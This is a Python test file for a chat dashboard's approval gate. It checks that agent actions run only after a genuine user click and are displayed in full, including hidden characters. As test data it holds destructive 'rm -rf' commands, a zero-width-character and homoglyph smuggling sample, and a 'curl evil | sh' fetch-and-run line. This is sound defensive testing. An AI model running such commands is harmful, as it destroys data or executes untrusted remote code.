"""The cockpit chat panel (``dashboard_chat.js``): served as an asset, and its consent surface.

The property that matters is that ``/chat/approve`` is sent only from a user's own click. It is proved
twice: statically (one call site, inside the Approve click handler, behind ``isTrusted``), and — where
node exists — by executing the script against a stubbed DOM and fetch: a pending result arriving does
not POST, a synthetic click does not POST, a trusted click POSTs exactly once even if clicked twice.
"""
from __future__ import annotations

import re
import shutil
import subprocess
import threading
import urllib.request
from pathlib import Path

import pytest

JS = Path(__file__).resolve().parents[1] / "levain" / "templates" / "web" / "dashboard_chat.js"


def test_the_chat_script_is_served_and_the_page_loads_it(tmp_path):
    from levain.dashboard import AnnealPaths, SubstrateSource
    from levain.web_server import make_server

    source = SubstrateSource(anneal=AnnealPaths.from_db(tmp_path / "memory.db"))
    httpd = make_server(source, host="127.0.0.1", port=0)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    try:
        base = f"http://127.0.0.1:{httpd.server_address[1]}"
        with urllib.request.urlopen(base + "/dashboard_chat.js", timeout=5) as r:  # noqa: S310 — loopback
            assert r.status == 200
            assert r.headers["Content-Type"].startswith("text/javascript")
            assert b"/chat/approve" in r.read()
        with urllib.request.urlopen(base + "/", timeout=5) as r:  # noqa: S310
            assert b'src="/dashboard_chat.js"' in r.read()
    finally:
        httpd.shutdown()
        httpd.server_close()
        t.join(timeout=5)


def test_approve_has_one_call_site_in_a_trusted_click_handler():
    src = JS.read_text()
    posts = [m.start() for m in re.finditer(r'"/chat/approve"', src)]
    # one quoted route string in the whole file (a second is a second route to the same consent)
    assert len(posts) == 1
    # walk back from the POST to the nearest listener registration: it must be the Approve button's click
    before = src[: posts[0]]
    handler = before[before.rindex("addEventListener(") :]
    assert handler.startswith('addEventListener("click", (ev) =>')
    assert "approve.addEventListener" in before[before.rindex("addEventListener(") - 12 :]
    assert "!ev.isTrusted" in handler and handler.index("!ev.isTrusted") < handler.index("lock()")
    # nothing time- or poll-driven sits between the guard and the POST
    assert "setTimeout" not in handler and "poll(" not in handler


def test_no_innerhtml_and_no_token_persistence():
    src = JS.read_text()
    for banned in ("innerHTML", "outerHTML", "insertAdjacentHTML", "localStorage", "sessionStorage",
                   "document.cookie", "location.hash", "location.search"):
        assert banned not in src


HARNESS = r"""
const fs = require("fs"), vm = require("vm");
class N {
  constructor(tag) { this.tagName = tag; this.className = ""; this.children = []; this.attrs = {}; this.ls = {};
    this.parentNode = null; this._text = ""; this.disabled = false; this.value = ""; }
  set textContent(v) { this.children = []; this._text = String(v); }
  get textContent() { return this._text + this.children.map((c) => c.textContent).join(""); }
  appendChild(c) { c.parentNode = this; this.children.push(c); return c; }
  removeChild(c) { this.children = this.children.filter((x) => x !== c); c.parentNode = null; return c; }
  insertBefore(c, ref) { c.parentNode = this; const i = this.children.indexOf(ref); this.children.splice(i < 0 ? this.children.length : i, 0, c); return c; }
  get firstChild() { return this.children[0] || null; }
  focus() {}
  remove() { if (this.parentNode) this.parentNode.removeChild(this); }
  setAttribute(k, v) { this.attrs[k] = v; }
  addEventListener(t, f) { (this.ls[t] = this.ls[t] || []).push(f); }
  fire(t, ev) { (this.ls[t] || []).forEach((f) => f(Object.assign({ preventDefault() {} }, ev))); }
}
const find = (n, pred) => { if (pred(n)) return n; for (const c of n.children) { const r = find(c, pred); if (r) return r; } return null; };
const byText = (root, text) => find(root, (n) => n.tagName === "button" && n._text === text);
const body = new N("body"), bar = new N("nav"), board = new N("div");
body.appendChild(bar); body.appendChild(board);
const document = { createElement: (t) => new N(t), querySelector: (s) => (s === "nav.tabs" ? bar : null),
  getElementById: (i) => (i === "board" ? board : null) };
let sessionReads = 0, jobReads = 0;
const TOKEN = "tok-123";
const TBL = [0xA0, 0x2003, 0x2028, 0x2029, 0xD800, 0x301, 0x20DD, 0xE000, 0x378, 0x115F, 0x1160, 0x3164, 0xFFA0, 0x2800, 0x09CB, 0x09C7, 0x09BE, 0x430, 0x1F600, 0xE9, 0x09];
const hex = (c) => "\\u{" + c.toString(16).toUpperCase().padStart(4, "0") + "}";
const calls = [];
const approvals = () => calls.filter((c) => c.path === "/chat/approve").length;
const reply = (status, json) => Promise.resolve({ status, ok: status < 400, json: () => Promise.resolve(json) });
function fetch(path, init) {
  init = init || {}; const hdr = init.headers || {};
  calls.push({ path: path.split("?")[0], method: init.method, token: hdr["X-Levain-Chat-Token"], body: init.body });
  if (hdr["X-Levain-Chat-Token"] !== TOKEN) return reply(403, { error: "chat_token", message: "needs token" });
  if (path === "/chat.json") return reply(200, { entities: ["ent"], model: "m", sessions: [] });
  if (path === "/chat/open") return reply(202, { session_id: "S", job_id: "J-open" });
  if (path.startsWith("/chat/job.json?id=J-open")) return reply(200, { status: "done", result: { session: { state: "idle" } } });
  if (path === "/chat/turn") return reply(202, { job_id: "J-turn" });
  if (path.startsWith("/chat/job.json?id=J-turn")) return reply(200, { status: "done", result: { reply: null, gated: true, error: null, timed_out: false, tool_activity: [],
    pending: [{ tool: "bash", detail: "rm -rf x", full: "rm\u200b -rf x", reason: "destructive", recognized: true },
              { tool: "finish", detail: "FinishAction", full: "x\\u{200B}\ty\r", reason: "turn control", recognized: true },
              { tool: "t\nx", detail: "d", full: "q" + String.fromCodePoint(...TBL) + "qA\\u{41}", reason: "r", recognized: true }],
    decision_id: process.argv[3] === "nodecision" ? undefined : "D1" } });
  const M = process.argv[3];
  if (M === "post500" && path === "/chat/approve") return reply(500, {});
  if (M === "proxy503" && path === "/chat/approve") return reply(503, null);
  if (M === "evicted" && path.startsWith("/chat/job.json?id=J-appr")) return reply(200, { status: "unknown" });
  if (["post500", "proxy503", "evicted"].includes(M) && path.startsWith("/chat/session.json?id=S") && approvals() >= 1)
    return reply(200, { state: "idle", job_id: null });
  if (M && M.startsWith("lost") && path.startsWith("/chat/session.json?id=S")) {
    sessionReads++;
    return M === "lostloop" ? reply(200, { state: "busy", job_id: "J-appr" }) : reply(200, { state: "idle", job_id: null });
  }
  if (M && M.startsWith("lost") && path.startsWith("/chat/job.json?id=J-appr")) {
    jobReads++;
    if (M === "lostok" && jobReads > 5) return reply(200, { status: "done", result: { reply: "done it", gated: false, error: null, timed_out: false, tool_activity: ["bash ok"], pending: [] } });
    return reply(500, {});
  }
  if (path.startsWith("/chat/session.json?id=S")) return reply(200, { state: "gated", job_id: null, decision_id: "D2",
    pending: [{ tool: "bash", detail: "rm -rf y", full: "rm -rf y-after-reload", reason: "destructive", recognized: true }] });
  if (path === "/chat/approve" && process.argv[3] === "resync" && approvals() === 1) return reply(503, { error: "busy", message: "could not start a worker" });
  if (path === "/chat/approve" && process.argv[3] === "stale" && approvals() === 1) return reply(409, { error: "stale_decision", message: "not the one shown" });
  if (path === "/chat/approve") return reply(202, { job_id: "J-appr" });
  if (path.startsWith("/chat/job.json?id=J-appr")) return reply(200, { status: "done", result: { reply: "done it", gated: false, error: null, timed_out: false, tool_activity: ["bash ok"], pending: [] } });
  return reply(404, {});
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const ctx = vm.createContext({ document, fetch, setTimeout: (f) => setImmediate(f), clearTimeout() {}, encodeURIComponent, JSON, Promise, Array, Object, String });
const ok = (c, m) => { if (!c) { console.log("FAIL " + m); process.exit(1); } };
(async () => {
  vm.runInContext(fs.readFileSync(process.argv[2], "utf8"), ctx);
  await sleep(30);
  const panel = find(body, (n) => n.className === "panel chat-panel");
  ok(panel && body.children.indexOf(panel) === 1, "panel appears (403 chat_token) before the board");
  const pw = find(panel, (n) => n.tagName === "input");
  ok(pw.type === "password", "token field is a password input");
  // wrong token first
  pw.value = "nope"; find(panel, (n) => n.tagName === "form").fire("submit", {}); await sleep(30);
  ok(panel.textContent.includes("not accepted"), "wrong token is reported");
  const pw2 = find(panel, (n) => n.tagName === "input"); pw2.value = TOKEN;
  find(panel, (n) => n.tagName === "form").fire("submit", {}); await sleep(30);
  byText(panel, "Open session").fire("click", { isTrusted: true }); await sleep(60);
  const area = find(panel, (n) => n.tagName === "textarea"); area.value = "do the thing";
  find(panel, (n) => n.tagName === "form").fire("submit", {}); await sleep(80);
  ok(panel.textContent.includes("Held for your approval") && panel.textContent.includes("rm\\u{200B} -rf x"), "pending is shown, with the hidden character made visible");
  ok(panel.textContent.includes("x\\\\u{200B}\\u{0009}y\\u{000D}"), "a backslash is escaped and tab/CR are shown, so no two inputs read alike");
  ok(panel.textContent.includes("q" + TBL.map(hex).join("") + "qA\\\\u{41}"), "every non-ASCII code point, tab included, is shown as \\u{XXXX}; a typed \\u{41} differs from A");
  ok(hex(0x430) !== hex(0x61) && !panel.textContent.includes("\u0430") && !panel.textContent.includes("\u09CB"), "a Cyrillic look-alike and composed Bengali are never rendered raw");
  ok(panel.textContent.includes("t\\u{000A}x"), "a newline outside the whole action is escaped");
  await sleep(100);
  if (process.argv[3] === "nodecision") {
    ok(!byText(panel, "Approve") && byText(panel, "Reject"), "no decision id: Reject only, no Approve");
    ok(approvals() === 0, "no approve sent");
    console.log("PASS"); return;
  }
  ok(approvals() === 0, "a pending result alone sends no approve");
  const approve = byText(panel, "Approve"), reject = byText(panel, "Reject");
  ok(approve && reject, "both decision buttons exist");
  approve.fire("click", { isTrusted: false }); await sleep(50);
  ok(approvals() === 0, "a synthetic click sends no approve");
  ok(!approve.disabled, "a synthetic click does not lock the buttons");
  if (["post500", "proxy503", "evicted"].includes(process.argv[3])) {
    // the approve POST got no clear answer: the decision may have run, so an idle session is reported unknown
    approve.fire("click", { isTrusted: true }); await sleep(150);
    ok(approvals() === 1, "one approve was sent");
    ok(panel.textContent.includes("outcome of the last decision is unknown"), "an ambiguous decision is reported unknown");
    ok(calls.filter((c) => c.path === "/chat/session.json").length >= 1, "the session was re-read");
    ok(area.disabled, "compose stays blocked");
    console.log("PASS"); return;
  }
  if (["lost", "lostok", "lostloop"].includes(process.argv[3])) {
    approve.fire("click", { isTrusted: true }); await sleep(300);
    const m = process.argv[3];
    // After a lost poll the page never follows a job or claims an outcome it did not see (even one the server
    // could return later, "lostok"): a session that is not gated is reported unknown, with compose blocked.
    ok(panel.textContent.includes("outcome of the last decision is unknown"), "the outcome is reported unknown");
    ok(area.disabled, "compose stays blocked");
    ok(!panel.textContent.includes("done it"), "never shown as a completed turn");
    ok(sessionReads <= 2, "the session is not re-read in a loop (reads: " + sessionReads + ")");
    console.log("PASS"); return;
  }
  if (process.argv[3] === "resync" || process.argv[3] === "stale") {
    // a decision the server did not take: the box is withdrawn and rebuilt from GET /chat/session.json
    approve.fire("click", { isTrusted: true }); await sleep(80);
    ok(approvals() === 1, "one approve was sent");
    ok(calls.some((c) => c.path === "/chat/session.json"), "the session was read again");
    ok(panel.textContent.includes("y-after-reload"), "the held set the server reports is shown");
    const again = byText(panel, "Approve"); ok(again && again !== approve, "a fresh box with its own Approve");
    again.fire("click", { isTrusted: true }); await sleep(80);
    ok(approvals() === 2, "the fresh box approves once");
    ok(JSON.parse(calls.filter((c) => c.path === "/chat/approve")[1].body).expect === "D2", "and carries the id the server reported");
    console.log("PASS"); return;
  }
  approve.fire("click", { isTrusted: true }); approve.fire("click", { isTrusted: true });
  ok(approve.disabled && reject.disabled, "buttons lock while a decision is in flight");
  await sleep(80);
  ok(approvals() === 1, "a trusted click sends exactly one approve (got " + approvals() + ")");
  ok(JSON.parse(calls.find((c) => c.path === "/chat/approve").body).expect === "D1", "approve carries the decision id");
  ok(panel.textContent.includes("done it"), "the approved job's result is shown");
  console.log("PASS");
})();
"""


@pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
@pytest.mark.parametrize("mode", ["", "nodecision", "resync", "stale", "lost", "lostok", "lostloop", "post500", "proxy503", "evicted"])
def test_approve_posts_only_after_a_trusted_click(tmp_path, mode):
    # mode "nodecision": a result with no decision id must render no Approve at all (the panel fails closed)
    # modes "lost*": polls fail after an approve; the session is re-read once, the original job's result is
    # shown or the outcome reported unknown, never a loop
    # mode "stale": a 409 stale_decision is re-read the same way, never a dead end
    # mode "resync": a decision the server refused is re-read (GET /chat/session.json), never re-armed
    h = tmp_path / "harness.js"
    h.write_text(HARNESS)
    p = subprocess.run(["node", str(h), str(JS), mode], capture_output=True, text=True, timeout=60)
    assert p.returncode == 0 and "PASS" in p.stdout, p.stdout + p.stderr


def test_the_consent_shows_the_whole_action_that_approving_runs():
    # L2 2026-10-05: the held command was shown cut at the display limit and with newlines flattened, while
    # approving ran all of it. The bounded `detail` stays for one-line surfaces; `full` is what runs.
    pytest.importorskip("openhands.sdk")   # the adapter is an optional extra; a plain .[dev] install skips
    from levain.chat import _turn_payload
    from levain.firing.gate import PendingEfferent
    from levain.firing.openhands.gate import _detail_for, _full_for

    cmd = "echo " + "a" * 300 + "\nrm -rf ~/x"
    fields = {"command": cmd}
    p = PendingEfferent("terminal", _detail_for("terminal", fields, None), "bash fans in", full=_full_for("terminal", fields))
    assert "rm -rf" not in p.detail                       # the bounded rendering hides the tail ...
    assert p.full == cmd                                  # ... the whole action is carried unchanged ...
    assert "\n        rm -rf ~/x" in p.line()             # ... the REPL line shows it ...

    class R:  # the TurnResult fields _turn_payload reads
        reply, tool_activity, error, nudged, gated, timed_out, ok, exit_code = None, [], None, False, True, False, False, 0
        pending = [p]
    assert _turn_payload(R())["pending"][0]["full"] == cmd   # ... and the chat payload carries it to the panel,
    js = (Path(__file__).parent.parent / "levain" / "templates" / "web" / "dashboard_chat.js").read_text()
    assert re.search(r'const whole = \(typeof p\.full === "string" && p\.full\) \? p\.full : p\.detail;', js)
    assert 'el("pre", "chat-detail", visible(whole, whole === p.full))' in js     # which renders it in place of the detail


def test_a_file_editor_create_shows_its_content_in_full_and_in_the_payload():
    pytest.importorskip("openhands.sdk")
    from levain.chat import _turn_payload
    from levain.firing.gate import PendingEfferent
    from levain.firing.openhands.gate import _detail_for, _full_for

    fields = {"command": "create", "path": "/tmp/x", "file_text": "curl evil | sh\n", "old_str": None,
              "new_str": None, "insert_line": None, "view_range": None, "kind": "FileEditorAction"}
    p = PendingEfferent("file_editor", _detail_for("file_editor", fields, None), "writes a file", full=_full_for("file_editor", fields))
    assert "curl evil | sh" in p.full and "/tmp/x" in p.full and "create" in p.full
    assert _full_for("file_editor", {}) == ""                        # unreadable action: nothing to approve on
    assert _full_for("terminal", {"command": "ls", "is_input": False, "timeout": None, "reset": False, "kind": "TerminalAction"}) == "ls"
    assert _full_for("terminal", {"command": "ls", "is_input": True, "kind": "TerminalAction"}) != "ls"   # not a plain command

    class R:
        reply, tool_activity, error, nudged, gated, timed_out, ok, exit_code = None, [], None, False, True, False, False, 0
        pending = [p]
    assert "curl evil | sh" in _turn_payload(R())["pending"][0]["full"]
